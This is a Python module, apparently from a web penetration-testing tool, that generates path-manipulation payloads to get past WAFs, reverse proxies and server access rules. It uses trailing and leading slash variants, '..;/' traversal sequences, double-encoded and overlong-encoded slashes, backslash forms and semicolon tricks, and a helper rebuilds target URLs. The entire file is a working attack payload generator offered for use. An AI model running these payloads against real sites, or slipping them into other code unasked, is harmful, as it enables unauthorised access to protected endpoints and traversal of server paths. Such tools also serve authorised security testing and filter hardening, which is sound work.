"""
Path Slash Bypass module.

Generates payloads that abuse how different layers (WAF, reverse proxy,
web server, application) parse path separators, dots, and semicolons.
"""

from urllib.parse import urlparse


# Suffixes appended to the base path
TRAILING_SUFFIXES = [
    "/", "//", "///", "////",
    "/.", "/./", "/.//",
    "/..", "/../", "/..//", "/..;/", "/..;//",
    "/.;/", "/.;//",
    "/;", "/;/", "/;//", "/;?", "/;x", "/;x/",
    "/?", "/?;", "/#", "/#?",
    "/%2f", "/%2f/", "/%2f%2f",
    "/%5c", "/%5c/",
    "/%00", "/%09", "/%20", "/%23",
    "/%3b", "/%3b/", "/%3f", "/%3f/",
    "?", "?;", "??", "?#", "?%23",
    "#", "#?",
    "%20", "%09", "%00", "%23",
    "%2e", "%2e/", "%2e%2e", "%2e%2e/",
    "%252f", "%252e",
    "%3b", "%3b%2f", "%3b%2f%2e%2e",
    ";%2f", ";%2f..", ";%2f%2e%2e",
]

# Prefixes prepended to the base path
LEADING_PREFIXES = [
    "/", "//", "///", "////",
    "/.", "/./", "/..", "/../", "/..;/",
    "/;", "/;/",
    "/%2e", "/%2e/", "/%2e%2e", "/%2e%2e/",
    "/%2f", "/%2f/", "/%5c", "/%5c/",
    "/%252e", "/%252e/", "/%252e%252e", "/%252e%252e/",
    "/%252f", "/%252f/",
    "%2e", "%2e/", "%2e%2e", "%2e%2e/",
    "%2f", "%2f/", "%252f", "%252f/",
    ";", ";/", ";//",
]

# Mixed combos (appended to base)
MIXED_PAYLOADS = [
    "/.", "/./", "/..", "/../", "/../../", "/../../../", "/../../../..",
    "/;", "/;/", "/;//", "/;.", "/;./", "/;./.", "/;.//",
    "/.;", "/.;/", "/.;//",
    "/..;/", "/..;/..;/", "/..;//", "/..;//../", "/..;//..;/",
    "/..;/;/", "/..;/;/..;/",
    "/..%2f", "/..%2f..%2f", "/..%2f..%2f..%2f", "/..%2f..%2f..%2f..%2f",
    "/..%2f/", "/..%2f//",
    "/..%252f",
    "/%2e%2e/", "/%2e%2e%2f", "/%2e%2e%2f%2e%2e",
    "/%252e%252e/", "/%252e%252e%252f", "/%252e%252e%252f%252e%252e",
]

# Encoded slash variants
ENCODED_SLASHES = [
    "%2f", "%2F", "%252f", "%252F",
    "%c0%af", "%ef%bc%8f", "%e0%80%af", "%u002f",
]


def _normalize(path):
    p = path or "/"
    if not p.startswith("/"):
        p = "/" + p
    return p.rstrip("/") or "/"


def _split_base(path):
    p = _normalize(path)
    if "/" not in p[1:]:
        return "/", p[1:]
    head, _, last = p.rpartition("/")
    return head or "/", last


def generate_path_slash_bypass(path):
    base = _normalize(path)
    head, last = _split_base(base)

    results = []
    seen = set()

    def add(desc, new_path):
        if not new_path.startswith("/"):
            new_path = "/" + new_path
        if new_path in seen:
            return
        seen.add(new_path)
        results.append((desc, new_path))

    # 1) Trailing suffixes
    for suffix in TRAILING_SUFFIXES:
        add(f"Trail: {suffix}", base + suffix)

    # 2) Leading prefixes
    for prefix in LEADING_PREFIXES:
        stripped = base.lstrip("/")
        add(f"Lead: {prefix}", prefix + stripped)

    # 3) Last-segment suffix
    if last:
        prefix = head.rstrip("/") or ""
        for suffix in (";", ";x", "?", "#", "%00", "%09", "%20", "."):
            add(f"LastSeg: {last}{suffix}", f"{prefix}/{last}{suffix}")

    # 4) Mixed
    for tail in MIXED_PAYLOADS:
        add(f"Mix: {tail}", base + tail)

    # 5) Encoded slash between segments
    if "/" in base.lstrip("/"):
        parts = base.lstrip("/").split("/")
        for enc in ENCODED_SLASHES:
            joined = enc.join(parts)
            add(f"EncSlash: {enc}", "/" + joined)
            add(f"EncSlash-mixed: {enc}", "/" + joined + "/")

    # 6) Backslash variants
    add("Backslash:", "/" + base.lstrip("/").replace("/", "\\"))
    add("Backslash-trail:", base + "\\")
    add("Backslash-lead:", "\\" + base.lstrip("/"))

    # 7) Combos
    for prefix in ["/./", "/../", "/..;/", "//"]:
        for suffix in ["/", "/.", "/..", "/..;/", "/;", "//"]:
            stripped = base.lstrip("/")
            add(f"Combo: {prefix}...{suffix}", prefix + stripped + suffix)

    return results


def apply_to_url(url, new_path):
    """Rebuild the URL with a new path while keeping host, port, query."""
    # Ensure path starts with '/'
    if not new_path.startswith("/"):
        new_path = "/" + new_path

    parsed = urlparse(url)
    scheme = parsed.scheme or "http"
    host = parsed.hostname or ""
    port = parsed.port

    netloc = host
    if port and not (
        (scheme == "http" and port == 80)
        or (scheme == "https" and port == 443)
    ):
        netloc = f"{host}:{port}"

    query = f"?{parsed.query}" if parsed.query else ""
    return f"{scheme}://{netloc}{new_path}{query}"